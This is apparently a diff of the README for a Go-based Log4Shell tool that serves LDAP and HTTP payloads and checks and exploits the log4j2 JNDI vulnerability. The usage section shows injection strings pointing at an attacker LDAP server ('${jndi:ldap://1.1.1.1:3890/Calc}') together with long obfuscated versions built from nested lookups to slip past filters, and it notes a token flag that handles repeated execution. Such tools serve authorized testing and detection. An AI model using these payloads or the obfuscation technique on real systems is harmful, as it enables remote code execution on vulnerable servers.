@@ -1,6 +1,7 @@
 # Log4Shell
- * Check, exploit, obfuscate, TLS, ACME in one Go program.
- * You don't need to install anything except develop it.
+ * Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
+ * Support common operating systems, not need install any dependency.
+ * Don't need to install anything except you want to develop this project.
 
 ## Usage
  ### Start LDAP and HTTP server
@@ -17,19 +18,29 @@
  ### Obfuscate malicious(payload) string
    ```
    Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
+   ```
+   ```
+   raw: ${jndi:ldap://1.1.1.1:3890/Calc_27sHQFpxvwFamvBP}
 
-   raw: ${jndi:ldap://1.1.1.1:3890/Calc}
+   ${j${Wmmra:CaPId:-nd}${Pd:nmPbJde:vWo9b:MUDN6w:-i:l}dap${73xrLJ:ml9s81:-}${J4T2-fyx2:-:}
+   /${PU1W:Ojl2xNxM:LZdr6:Rnb:-/1.}1.${R1Edku:MWjEv3bG:ZKMVOC4d5C:hxjRF:-}${5h2bPs:ItU:-1.}
+   ${ogS5N:nmmhQcYA8-axELsuz03:14:-}${rP:8SL:-}${l31C:0X1Ey:-1}${NANl9M:Pfxb2obs9-PU5bDprOX
+   leb-wHz:-:3}${4MyG:H2h1V2rcTu-P6IDGS4eL:Hk2e:-}${kBUQ:DWF8O:RGSKOognGm:Gcb4g:-890}${kt:R
+   Nj1QL:LJq3xSbQ-QMJ:-/}${mu9nfI-wJul-thdzcWf5G-1eYs:-}C${Cw:CrVaSz-zv:-alc}_2${Pk-1FL1teD
+   6OlWC:yIn6DNeu6-8UUF:-7s}${GDuei:4HWSj:Ra31Mg-PZsPG:-HQF}${myZoY-7Oko:-px}${Tc3hLd-XdMY7
+   :-v}${XaDK4l:oWc:-w}${ZE-TP:-}Fa${2SuF:n465x:-m}${Cdh5xl-hblvwX4Kq:Mj:-v}BP${5V8O-CwErDR
+   2Ji:UjT:-}}
 
-   ${jn${Nc3-h17cwiZ-bRU2sh:-di:}${CGPuF-OGZxNU-zZfWp:-l}${wW:sVK9ZUijf:jUelV4upFr:wjD:-}d${OZQ-MqOEGT9K
-   -IAdC:-ap}${Kce64-15l39K4DD5-xWtee:zY:-:/}${gZm-yFU0:-}${o05ov5-9bU2WWgtlf:PK5:-/}${y7sa1T:aFd6Q7S45r
-   -KYGD:-}${0dPYxy:IqCd:-1}${YSf-yHfZ:-.1}${Jct1X-kQVdPM:cKmXcaheDfY:kI:-}.${It:CK52YEP-6HC:-1.1}${rzgS
-   :e1wOc5zHLe-Q1tI2IqBj-G2A:-}:3${NMDyH8-bsqLVD-m0HdT:ik:-}${Bg-2GX6XW:CFHnf:-}${4sqv:HPwwv:-89}0${BzHb
-   q-JBkQtJ7qDz:L7PaQXH:PUYv91:-/C}${QfhcM:tn:-}${6e-OkiFFt:WtnF:-al}c${etTbi-iWYq-pvATIA6K2K:Rq:-}}
+   Each string can only be used once, or wait 20 seconds.
+   ```
+   ```
+   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the
+   number of repetitions is equal the number of occurrences about string "${". The LDAP
+   server add a simple token mechanism for prevent it. 
    ```
 
 ## Check
  * start Log4Shell server
- * put your class file to the payload directory
  * send ```${jndi:ldap://1.1.1.1:3890/Nop}```
  * send ```${jndi:ldaps://example.com:3890/Nop}``` with TLS
 
@@ -59,7 +70,7 @@
 
 Usage of Log4Shell.exe:
   -auto-cert
-        use ACME client to sign certificate
+        use ACME client to sign certificate automatically
   -host string
         server IP address or domain name (default "127.0.0.1")
   -http-addr string
@@ -70,6 +81,8 @@ Usage of Log4Shell.exe:
         ldap server address (default ":3890")
   -ldap-net string
         ldap server network (default "tcp")
+  -no-token
+        not add random token when use obfuscate
   -obf string
         obfuscate malicious(payload) string
   -payload string
